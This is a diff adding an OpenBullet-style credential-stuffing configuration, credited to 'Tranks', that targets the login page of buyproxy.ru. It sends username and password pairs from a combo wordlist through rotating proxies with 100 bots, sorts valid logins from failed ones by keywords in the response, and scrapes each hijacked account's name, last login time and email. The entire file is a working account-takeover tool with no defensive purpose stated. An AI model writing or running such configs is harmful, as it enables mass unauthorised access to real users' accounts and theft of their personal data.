@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Buyproxy ru",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-06T23:11:36.9817391+02:00",
+  "AdditionalInfo": "",
+  "Author": "Tranks",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login REQUEST POST "https://buyproxy.ru/login.php" 
+  CONTENT "login=<USER>&password=<PASS>&enter=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: MMozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The user does not exist." 
+  KEYCHAIN Success OR 
+    KEY "|||ok|||" 
+    KEY "/\">Your profile</a>" 
+#Tranks_1 PARSE "<SOURCE>" LR "<font>Your name:" "</font><br>" -> CAP "Name" 
+#Tranks_2 PARSE "<SOURCE>" LR "<font>Last login:" "</font><br>" -> CAP "Last login" 
+#Tranks_3 PARSE "<SOURCE>" LR "<font>Email:" "</font><br>" -> CAP "Email" "" "  | By:Tranks" 
